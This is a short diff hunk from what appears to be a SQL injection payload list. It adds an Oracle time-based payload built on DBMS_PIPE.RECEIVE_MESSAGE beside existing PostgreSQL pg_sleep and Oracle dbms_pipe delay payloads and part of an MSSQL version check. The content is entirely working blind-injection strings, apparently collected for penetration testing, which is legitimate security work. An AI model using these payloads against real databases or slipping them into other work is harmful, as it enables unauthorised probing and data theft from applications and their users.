@@ -1003,6 +1003,7 @@ if (@@VERSION)=9 select 1 else select 2;
 ' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 
 -- Oracle
+3'||DBMS_PIPE.RECEIVE_MESSAGE('TeSt',8)||'
 ' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NULL--
 ' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END IS NULL--
 
